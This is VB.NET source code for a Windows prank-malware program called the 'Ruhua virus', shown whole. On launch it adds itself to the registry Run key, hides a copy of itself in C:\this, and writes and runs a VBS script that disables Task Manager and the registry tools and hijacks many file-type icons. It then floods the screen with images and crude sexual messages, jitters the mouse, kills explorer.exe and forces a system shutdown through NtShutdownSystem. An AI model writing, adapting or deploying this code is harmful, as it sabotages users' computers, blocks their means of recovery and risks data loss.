Imports System.Windows.Forms
Imports System.Drawing
Imports System.IO
Imports System.Media.SoundPlayer
Imports System.Reflection
Imports System.Collections.Generic
Imports 如花病毒.Form2.SoundW
Imports 反色模块
Imports 如花病毒.My.Resources.Resource1
Public Class Form2
    Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
    Public Declare Function NtShutdownSystem Lib "ntdll" (ByVal ShutdownAction As Long) As Long
    Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As IntPtr '获得窗体Dc
    Public Declare Function GetDesktopWindow Lib "user32" () As IntPtr '获得整个桌面绘制
    Public Declare Function SetCursorPos Lib "user32" (ByVal x As Integer, ByVal y As Integer) As Integer '设置鼠标位置。
    Public Declare Function Beep Lib "kernel32" (dwFreq As Integer, dwDuration As Integer) As Integer
    Public list As New List(Of String) From {"如花正在强奸你的电脑", "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW", "草（日语）", "如花正在强吻你的电脑", "如花正在强暴你的电脑", "嘿嘿嘿嘿", "WTF", "你在想peach", "BigButt最棒！！！"} '集合的表示方法
    Public list2 As New List(Of Brush) From {Brushes.White, Brushes.Yellow, Brushes.Red, Brushes.Pink, Brushes.Green}
    Public list3 As New List(Of FontStyle) From {FontStyle.Regular, FontStyle.Italic, FontStyle.Bold, FontStyle.Underline, FontStyle.Strikeout}
    Public Random As New Random '定义取随机值函数(性能比rnd好，函数不消耗CPU)
    'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
    Const IsDebug As Boolean = False 'True为不执行破坏代码，FALSE为执行
    Private a As Long
    Enum SoundW
        Do0 = 264
        Re = 297
        Mi = 330
        Fa = 352
        Sol = 396
        La = 440
        Ti = 495
        Do1 = 528
        T4 = 1000
    End Enum
    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim streamwriter As New StreamWriter(New FileStream("Readme.MD", FileMode.Create))
        streamwriter.Write("Your computer was damaged by ruhua
你的电脑被如花亲坏了
In a word , your computer Not have any hop
一句话说， 你电脑没救了
")
        streamwriter.Flush()
        streamwriter.Dispose()
        '////////////////////////////////////////////////////////////////
        '将资源写入本地硬盘
        '////////////////////////////////////////////////////////////////
        Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
        If IsDebug Then GoTo debugTag
        ws = CreateObject("wscript.shell") '定义对象
        fso = CreateObject("scripting.filesystemobject") '定义对象
        a = 0
        ws.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\病毒子键", "C:\this\rh.exe", "REG_SZ")
        If (Not fso.FolderExists("C:\this")) Then '如果C盘下的this文件夹没有则创建
            ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
            fso.createfolder("C:\this") '创建文件夹
            fso.CopyFile(Application.ExecutablePath, "C:\this\rh.exe")
            ws.run("cmd.exe /c attrib ""C:\this"" +h", 0) '批处理隐藏文件夹
            ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ") 'Load picture file in regedit.exe
            Dim s As Stream = File.Create("C:\this\rh.jpg")
            s.Write(rh, 0, rh.Length)
            s.Dispose()
            Dim a
            a = fso.createtextfile("C:\this\a.vbs")
            With a
                .writeline("On Error Resume Next")
                .writeline("set ws=createobject(""wscript.shell"")")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr"",1,""REG_DWORD""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"",1,""REG_DWORD""")
                .writeline("for path=1 to 44")
                .writeline("ws.regwrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons\""&path,""C:\this\rh.exe"",""REG_SZ""")
                .writeline("Next")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\exefile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\zipfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\lnkfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\mp3file\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\mp4file\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\rmvbfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\pngfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\jpgfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\txtfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\htmlfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                .close
            End With
            ws.run("C:\this\a.vbs") 'run vbs
            Dim o As Object = CreateObject("scripting.filesystemobject")
            'Threading.Thread.Sleep(5000) '延时5秒
            'RtlAdjustPrivilege(&H13, &H1, &H0, &H0) '提升到关机权限
            'NtShutdownSystem(&H0) '关机
            'Dim sound As Byte() = My.Resources.Resource1.sound
            'Dim music As Stream = File.Create("C:\this\sound.mp3")
            'music.Write(sound, 0, sound.Length)
            'music.Close()
            '////////////////////////////////////////////////////////////////
            'this is end
            '////////////////////////////////////////////////////////////////
        End If
debugTag:'以上都是破坏代码
        Dim newthread0 As New Threading.Thread(AddressOf General)
        newthread0.Start()
        Timer2.Start()
        Dim newthread3 As New Threading.Thread(AddressOf Music)
        newthread3.Start()
    End Sub
    Sub General()
        Shell("notepad.exe ""Readme.MD""", AppWinStyle.NormalFocus)
        Dim form2 As New Form2
        'form2.Hide()
        Dim newthread As New Threading.Thread(AddressOf ShakeMouse)
        newthread.Start()
        Dim newthread2 As New Threading.Thread(AddressOf DrawError)
        newthread2.Start()
        Dim newthread4 As New Threading.Thread(AddressOf Icoc)
        newthread4.Start()
        Threading.Thread.Sleep(1000 * 60)
        Dim newthread5 As New Threading.Thread(AddressOf CrazyString)
        newthread5.Start()
        'Dim newthread3 As New Threading.Thread(AddressOf Playsound)
        'newthread3.Start()
        Threading.Thread.Sleep(1000 * 60 * 4)
        Shell("taskkill /im explorer.exe /f", 0)
        Threading.Thread.Sleep(1000 * 60)
        RtlAdjustPrivilege(&H13, &H1, &H0, &H0)
        NtShutdownSystem(&H0)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim form As New Form1
        form.Show()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Top = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2)
        Me.Left = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7)
    End Sub
    Sub ShakeMouse()
        Threading.Thread.Sleep(10000)
        Dim where As Point
        Do
            where = MousePosition '获得当前鼠标位置
            SetCursorPos(CDbl(where.X) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.Y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
            Threading.Thread.Sleep(50) 'stop 50 milliseconds
        Loop
    End Sub
    Sub DrawError()
        Threading.Thread.Sleep(10000)
again:
        Dim ico As Icon = My.Resources.Resource1.tast 'Get tast icon
        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'Get Desktop Graphics
        Do
            Try
                screen.DrawImage(ico.ToBitmap, MousePosition.X, MousePosition.Y)
                Threading.Thread.Sleep(10)
            Catch ex As Exception '如果超出内存则运行下面的
                screen.Dispose() '释放对象和对象句柄
                Threading.Thread.Sleep(10000) 'stop 10 second
                GoTo again 'jump to again
            End Try
        Loop
    End Sub
    'Sub Playsound() '播放灵魂歌曲
    'Dim music As String = "C:\this\sound.mp3"
    '   PlaySound(music, 0, &H20000)
    '  Threading.Thread.Sleep(1000 * 60)
    'End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        a += 1
        If a = 120 Then
            Timer3.Start()
        ElseIf a = 240 Then
            Timer1.Start()
        End If
    End Sub
    Sub Music()
        Beep(Fa, 500)
        Beep(Fa, 300)
        Beep(Fa, 300)
        Beep(Sol, 300)
        Beep(La, 500)
        Beep(La, 800)
        Beep(Mi, 800)
        Threading.Thread.Sleep(1000)
        Beep(Re, 500)
        Beep(Re, 300)
        Beep(Re, 300)
        Beep(Mi, 300)
        Beep(Fa, 500)
        Beep(Fa, 800)
        Beep(Do0, 800)
        Threading.Thread.Sleep(1000)
        Beep(Do0, 500)
        Beep(Mi, 500)
        Beep(Re, 500)
        Threading.Thread.Sleep(1000)
        Beep(Do0, 500)
        Beep(Mi, 500)
        Beep(Re, 500)
        Threading.Thread.Sleep(1000)
        Beep(Do0, 500)
        Beep(Mi, 500)
        Beep(Re, 500)
        Beep(Re, 800)
        Beep(Re, 1000)
        Beep(800, 1000 * 3)
        Threading.Thread.Sleep(1000)
        Beep(800, 1000 * 3)
        Threading.Thread.Sleep(1000)
        Beep(800, 1000 * 3)
        Threading.Thread.Sleep(1000)
        Beep(800, 1000 * 3)
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim www As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow))
        Dim scr As Screen = Screen.PrimaryScreen
        Dim temp1 As New Bitmap(scr.WorkingArea.Width, scr.WorkingArea.Height)
        Dim ww As Graphics = Graphics.FromImage(temp1)
        ww.CopyFromScreen(New Point, New Point, scr.WorkingArea.Size)
        Dim handle As IntPtr = Class1.PContray(temp1).GetHicon
        www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
    End Sub
    Sub Icoc()
        Dim imagelist As New List(Of Image) From {My.Resources.Resource1.a.ToBitmap, b.ToBitmap, c.ToBitmap, d.ToBitmap, e.ToBitmap, f.ToBitmap, g.ToBitmap}
        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
        Threading.Thread.Sleep(1000 * 40)
        Do
            screen.DrawImage(imagelist.Item(Random.Next(0, imagelist.Count - 1)), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
            Threading.Thread.Sleep(1000)
        Loop
    End Sub
    Sub CrazyString()
        Threading.Thread.Sleep(1000 * 20)
        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
        Do
            Dim msg As String = list.Item(Random.Next(list.Count - 1)）
            Dim color As Brush = list2.Item(Random.Next(list2.Count - 1))
            Dim fontsyle As FontStyle = list3.Item(Random.Next(list3.Count - 1))
            Threading.Thread.Sleep(100)
            Dim rect As Rectangle = Windows.Forms.Screen.PrimaryScreen.WorkingArea '获得屏幕大小
            Dim font As Font = New Font(SystemFonts.MessageBoxFont.FontFamily, Random.Next(1, 25), fontsyle) '设置字体大小取随机值
            screen.DrawString(msg, font, color, New PointF(Random.Next(rect.Width), Random.Next(rect.Height)))
        Loop
    End Sub
End Class
Module Program
#Disable Warning
    Function 加载反色模块(sender As Object, args As ResolveEventArgs) As Assembly
        If New AssemblyName(args.Name).Name = "反色模块" Then
            Return Assembly.Load(My.Resources.反色模块)
        End If
    End Function
#Enable Warning
    Sub Main()
        AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf 加载反色模块
        Application.EnableVisualStyles()
        Application.Run(New Form2)
    End Sub
End Module